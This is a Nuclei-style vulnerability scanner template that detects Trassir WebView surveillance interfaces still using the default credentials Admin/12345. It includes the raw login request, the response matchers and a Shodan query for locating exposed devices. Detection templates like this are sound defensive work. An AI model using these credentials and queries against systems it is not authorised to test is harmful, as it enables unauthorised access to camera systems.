id: trassir-default-login
info:
  name: Trassir WebView Default Login - Detect
  author: gtrrnr,metascan
  severity: high
  description: |
    Trassir WebView contains a default login vulnerability. An attacker can obtain access to user accounts and access sensitive information, modify data, and/or execute unauthorized operations.
  reference:
    - https://confluence.trassir.com/display/TKB/How+to+reset+the+administrator+password+on+the+TRASSIR+NVR
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "Trassir Webview"})
    max-request: 1
    shodan-query: title:"Trassir Webview"
    verified: true
  tags: default-login,trassir,vuln,webview
http:
  - attack: clusterbomb
    matchers:
      - case-insensitive: true
        condition: and
        part: body
        type: word
        words:
          - '"success" :'
          - '"sid" :'
      - part: header
        type: word
        words:
          - application/json
      - status:
          - 200
        type: status
    matchers-condition: and
    payloads:
      password:
        - 12345
      username:
        - Admin
    raw:
      - |
        POST /login HTTP/1.1
        Host: {{Hostname}}

        username={{username}}&password={{password}}
    stop-at-first-match: true
